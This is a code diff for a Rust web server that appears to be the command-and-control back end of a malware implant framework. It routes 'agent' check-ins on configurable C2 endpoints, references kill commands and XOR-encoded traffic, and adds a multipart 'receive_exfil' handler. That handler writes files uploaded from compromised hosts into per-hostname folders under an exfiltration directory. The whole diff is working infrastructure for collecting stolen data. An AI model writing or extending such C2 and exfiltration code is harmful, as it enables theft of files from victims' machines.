@@ -1,6 +1,7 @@
 use std::sync::Arc;
 
 use crate::{
+    EXFIL_PATH,
     agents::{extract_agent_id, handle_kill_command},
     app_state::AppState,
     exfil::handle_exfiltrated_file,
@@ -9,28 +10,43 @@ use crate::{
 };
 use axum::{
     Json,
-    extract::{Path, State},
-    http::{HeaderMap, StatusCode},
+    body::Body,
+    extract::{FromRequest, Multipart, Path, Request, State},
+    http::{HeaderMap, StatusCode, header::CONTENT_TYPE},
     response::IntoResponse,
 };
+use futures::{StreamExt, TryStreamExt};
 use shared::{
     net::{XorEncode, decode_http_response},
     tasks::{Command, FirstRunData},
 };
+use tokio::io::AsyncWriteExt;
 
-pub async fn handle_agent_post_with_path(
+pub async fn agent_post_handler_with_path(
     state: State<Arc<AppState>>,
     headers: HeaderMap,
     Path(endpoint): Path<String>,
-    Json(payload): Json<Vec<Vec<u8>>>,
+    req: Request<Body>,
 ) -> impl IntoResponse {
     let state_arc = Arc::clone(&state);
 
     {
         let lock = state_arc.endpoints.read().await;
         if lock.c2_endpoints.contains(&endpoint) {
-            // No requirement to further authenticate, as this is handled by the middleware
-            return handle_agent_post(state, headers, Json(payload))
+            drop(lock);
+            if is_multipart(req.headers()) {
+                match Multipart::from_request(req, &state).await {
+                    Ok(mp) => return receive_exfil(mp).await.into_response(),
+                    Err(_) => return StatusCode::BAD_REQUEST.into_response(),
+                }
+            }
+
+            let json = match Json::<Vec<Vec<u8>>>::from_request(req, &state).await {
+                Ok(payload) => payload,
+                Err(_) => return StatusCode::BAD_REQUEST.into_response(),
+            };
+
+            return handle_agent_post_standard(state, headers, json)
                 .await
                 .into_response();
         }
@@ -40,7 +56,29 @@ pub async fn handle_agent_post_with_path(
     StatusCode::BAD_GATEWAY.into_response()
 }
 
-pub async fn handle_agent_post(
+pub async fn agent_post_handler(
+    state: State<Arc<AppState>>,
+    headers: HeaderMap,
+    req: Request<Body>,
+) -> impl IntoResponse {
+    if is_multipart(req.headers()) {
+        match Multipart::from_request(req, &state).await {
+            Ok(mp) => return receive_exfil(mp).await.into_response(),
+            Err(_) => return StatusCode::BAD_REQUEST.into_response(),
+        }
+    }
+
+    let json = match Json::<Vec<Vec<u8>>>::from_request(req, &state).await {
+        Ok(payload) => payload,
+        Err(_) => return StatusCode::BAD_REQUEST.into_response(),
+    };
+
+    handle_agent_post_standard(state, headers, json)
+        .await
+        .into_response()
+}
+
+async fn handle_agent_post_standard(
     state: State<Arc<AppState>>,
     headers: HeaderMap,
     Json(payload): Json<Vec<Vec<u8>>>,
@@ -157,4 +195,54 @@ pub async fn handle_agent_post(
     // Serialise the response and return it
     //
     serialise_tasks_for_agent(tasks).await
+}
+
+async fn receive_exfil(mut mp: Multipart) -> Result<StatusCode, StatusCode> {
+    let mut hostname: Option<String> = None;
+    let mut source_path: Option<String> = None;
+
+    while let Some(mut field) = mp.next_field().await.map_err(|_| StatusCode::BAD_REQUEST)? {
+        match field.name() {
+            Some("hostname") => {
+                hostname = Some(field.text().await.map_err(|_| StatusCode::BAD_REQUEST)?)
+            }
+            Some("source_path") => {
+                source_path = Some(field.text().await.map_err(|_| StatusCode::BAD_REQUEST)?)
+            }
+            Some("file") => {
+                let host = hostname.as_deref().ok_or(StatusCode::BAD_REQUEST)?;
+                let path = source_path.as_deref().ok_or(StatusCode::BAD_REQUEST)?;
+
+                let mut dest = format!("{EXFIL_PATH}/{host}/{path}");
+                dest = dest.replace(r"C:\", "").replace('\\', "/");
+                if let Some(parent) = std::path::Path::new(&dest).parent() {
+                    tokio::fs::create_dir_all(parent)
+                        .await
+                        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+                }
+
+                let mut out = tokio::fs::File::create(&dest)
+                    .await
+                    .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+
+                let mut stream = field.into_stream();
+                while let Some(chunk) = stream.next().await {
+                    out.write_all(&chunk.map_err(|_| StatusCode::BAD_REQUEST)?)
+                        .await
+                        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+                }
+            }
+            _ => {}
+        }
+    }
+
+    Ok(StatusCode::OK)
+}
+
+fn is_multipart(headers: &HeaderMap) -> bool {
+    headers
+        .get(CONTENT_TYPE)
+        .and_then(|v| v.to_str().ok())
+        .map(|v| v.starts_with("multipart/"))
+        .unwrap_or(false)
 }
